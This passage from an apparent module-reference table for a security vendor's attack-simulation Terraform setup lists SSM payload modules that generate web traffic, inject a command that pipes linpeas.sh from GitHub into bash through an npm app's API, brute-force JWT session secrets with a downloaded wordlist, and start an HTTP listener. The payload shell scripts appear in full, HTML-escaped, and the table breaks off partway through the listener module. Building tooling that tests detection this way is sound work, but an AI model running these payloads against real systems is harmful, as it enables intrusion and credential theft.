                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| attacker-ssm-execute-generate-web-traffic-attacker                         | ./modules/ssm/execute-generate-web-traffic                     | ssm_exec_generate_web_traffic_attacker     | context.aws.ssm.attacker.execute.generate_web_traffic                     | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "generate_web_traffic": {<br/>                            "delay": 60,<br/>                            "enabled": false,<br/>                            "urls": []<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-web-traffic                     | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/generate&#45;web&#45;traffic&quot;<br/>    curl&&#35;95;urls = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for url in var&#46;inputs&&#35;91;&quot;urls&quot;&&#35;93;: &quot;curl &#45;s &#45;&#45;retry 20 &#45;&#45;retry&#45;connrefused &#45;&#45;retry&#45;delay 60 &#45;&#45;connect&#45;timeout 5 &&#35;x27;$&&#35;123;url&&#35;125;&&#35;x27;; log &&#35;92;&quot;curl $&&#35;123;url&&#35;125; result: $?&&#35;92;&quot;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;Enumerating urls&#46;&#46;&#46;&quot;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;Running url enumeration:&&#35;92;n$&&#35;123;local&#46;curl&&#35;95;urls&&#35;125;&quot;<br/>        $&&#35;123;local&#46;curl&&#35;95;urls&&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-ssm-execute-exploit-npm-app                                       | ./modules/ssm/execute-exploit-npm-app                          | ssm_exec_exploit_npm_app                   | context.aws.ssm.attacker.execute.exploit_npm_app                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "exploit_npm_app": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "target_ip": null,<br/>                            "target_port": 8089<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-npm-app                          | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/npm&&#35;95;attack&quot;<br/>    target&&#35;95;ip=var&#46;inputs&&#35;91;&quot;target&&#35;95;ip&quot;&&#35;93;<br/>    target&&#35;95;port=var&#46;inputs&&#35;91;&quot;target&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&#46;&#46;&#46;&quot;<br/>        log &quot;payload: curl &#45;&#45;get &#45;&#45;verbose &&#35;92;&quot;http://$&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;/api/getServices&&#35;92;&quot; &#45;&#45;data&#45;urlencode &&#35;x27;name&&#35;91;&&#35;93;=&&#35;92;$&&#35;40;$&&#35;123;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;125;&&#35;41;&&#35;x27;&quot;<br/>        log &quot;checking target: $&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $&&#35;123;local&#46;target&&#35;95;ip&&#35;125; $&&#35;123;local&#46;target&&#35;95;port&&#35;125; &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for target: $&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;&quot;;<br/>            sleep 30;<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log &quot;target available &#45; sending payload&quot;;<br/>        sleep 5;<br/>        curl &#45;&#45;get &#45;&#45;verbose &quot;http://$&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;/api/getServices&quot; &#45;&#45;data&#45;urlencode &&#35;x27;name&&#35;91;&&#35;93;=$&&#35;40;$&&#35;123;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;125;&&#35;41;&&#35;x27; &gt;&gt; $LOGFILE 2&gt;&amp;1;<br/>        echo &quot;&&#35;92;n&quot; &gt;&gt; $LOGFILE<br/>        log &quot;payload sent sleeping&#46;&#46;&#46;&quot;<br/>        log &quot;done&quot;;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| attacker-ssm-execute-exploit-authapp                                       | ./modules/ssm/execute-exploit-authapp                          | ssm_exec_exploit_authapp                   | context.aws.ssm.attacker.execute.exploit_authapp                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "exploit_authapp": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_user_first_name": null,<br/>                            "compromised_user_last_name": null,<br/>                            "enabled": false,<br/>                            "target_ip": null,<br/>                            "target_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-authapp                          | <pre>locals &&#35;123;<br/>    exploit&&#35;95;script = &quot;bruteforce&&#35;95;session&#46;py&quot;<br/>    usernames&&#35;95;script = &quot;generate&&#35;95;usernames&#46;py&quot;<br/>    attack&&#35;95;dir = &quot;/authapp&&#35;95;attack&quot;<br/>    target&&#35;95;ip=var&#46;inputs&&#35;91;&quot;target&&#35;95;ip&quot;&&#35;93;<br/>    target&&#35;95;port=var&#46;inputs&&#35;91;&quot;target&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;exploit&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; $&&#35;123;local&#46;exploit&&#35;95;script&&#35;125;<br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;usernames&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; $&&#35;123;local&#46;usernames&&#35;95;script&&#35;125; <br/>    echo $&&#35;123;base64gzip&&#35;40;local&#46;requirements&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; requirements&#46;txt<br/>    log &quot;installing required python3&#46;9&#46;&#46;&#46;&quot;<br/>    apt&#45;get install &#45;y python3&#46;9 python3&#46;9&#45;venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    curl https://bootstrap&#46;pypa&#46;io/get&#45;pip&#46;py &#45;o get&#45;pip&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    python3&#46;9 get&#45;pip&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;wait before using module&#46;&#46;&#46;&quot;<br/>    sleep 5<br/>    python3&#46;9 &#45;m pip install &#45;U pip setuptools wheel setuptools&&#35;95;rust jinja2 jc<br/>    log &quot;installing exploit requirements&#46;&#46;&#46;&quot;<br/>    python3&#46;9 &#45;m pip install &#45;&#45;ignore&#45;installed &#45;r requirements&#46;txt<br/>    <br/>    curl &#45;LJ https://raw&#46;githubusercontent&#46;com/danielmiessler/SecLists/89e486bd4e1bcd1bd3fc565216097a8d389f3983/Passwords/scraped&#45;JWT&#45;secrets&#46;txt &#45;o /tmp/scraped&#45;JWT&#45;secrets&#46;txt<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&#46;&#46;&#46;&quot;<br/>        log &quot;checking target: $&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $&&#35;123;local&#46;target&&#35;95;ip&&#35;125; $&&#35;123;local&#46;target&&#35;95;port&&#35;125; &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for target: $&&#35;123;local&#46;target&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;target&&#35;95;port&&#35;125;&quot;;<br/>            sleep 30;<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log &quot;target available &#45; sending payload&quot;;<br/>        sleep 5;<br/>        <br/>        &#35; brute force the session password<br/>        python3&#46;9 $&&#35;123;local&#46;exploit&&#35;95;script&&#35;125; &#45;&#45;host=$&&#35;123;local&#46;target&&#35;95;ip&&#35;125; &#45;&#45;port=$&&#35;123;local&#46;target&&#35;95;port&&#35;125; &#45;&#45;password&#45;list=/tmp/scraped&#45;JWT&#45;secrets&#46;txt &#45;&#45;output&#45;password&#45;list=/tmp/hydra&#45;passwords&#46;txt 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/><br/>        &#35; prep for second stage below providing usernames and password for lateral movement        <br/><br/>        &#35; result is hydra&#45;password list but we need a user list &#45; since external brute force isn&&#35;x27;t alerted on let&&#35;x27;s skip<br/>        &#35; python3&#46;9 $&&#35;123;local&#46;usernames&&#35;95;script&&#35;125; &#45;&#45;first=$&&#35;123;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;user&&#35;95;first&&#35;95;name&quot;&&#35;93;&&#35;125; &#45;&#45;last=$&&#35;123;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;user&&#35;95;last&&#35;95;name&quot;&&#35;93;&&#35;125; &#45;&#45;output=/tmp/hydra&#45;users&#46;txt<br/>        USER&&#35;95;NAME=&quot;$&&#35;40;echo &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;user&&#35;95;first&&#35;95;name&quot;&&#35;93;&&#35;125;&quot; &#124; tr &&#35;x27;&&#35;91;:upper:&&#35;93;&&#35;x27; &&#35;x27;&&#35;91;:lower:&&#35;93;&&#35;x27; &#124; cut &#45;c1&&#35;41;$&&#35;40;echo &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;user&&#35;95;last&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;&#124; tr &&#35;x27;&&#35;91;:upper:&&#35;93;&&#35;x27; &&#35;x27;&&#35;91;:lower:&&#35;93;&&#35;x27;&&#35;41;&quot;<br/>        log &quot;username: $USER&&#35;95;NAME&quot;<br/>        echo $USER&&#35;95;NAME &gt; /tmp/hydra&#45;users&#46;txt<br/><br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/><br/>    exploit         = file&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/bruteforce&&#35;95;session&#46;py&quot;, <br/>                            &&#35;41;<br/>    requirements    = file&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;, <br/>                            &&#35;41;<br/>    usernames       = file&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/generate&&#35;95;usernames&#46;py&quot;, <br/>                            &&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;<br/><br/></pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| attacker-ssm-listener-http-listener                                        | ./modules/ssm/listener-http-listener                           | ssm_exec_responder_http_listener           | context.aws.ssm.attacker.listener.http                                    | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "listener": {<br/>                        "http": {<br/>                            "enabled": false,<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 8080<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/listener-http-listener                           | <pre>locals &&#35;123;<br/>    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    listen&&#35;95;ip = var&#46;inputs&&#35;91;&quot;listen&&#35;95;ip&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    mkdir &#45;p /tmp/www/<br/>    echo &quot;index&quot; &gt; /tmp/www/index&#46;html<br/>    mkdir &#45;p /tmp/www/upload/v2<br/>    echo &quot;upload&quot; &gt; /tmp/www/upload/v2/index&#46;html<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;listener: $&&#35;123;local&#46;listen&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;listen&&#35;95;port&&#35;125;&quot;<br/>        screen &#45;S http &#45;X quit<br/>        screen &#45;wipe<br/>        APPLOG=/tmp/http&&#35;95;$SCRIPTNAME&#46;log<br/>        for i in &&#35;96;seq $&&#35;40;&&#35;40;MAXLOG&#45;1&&#35;41;&&#35;41; &#45;1 1&&#35;96;; do mv 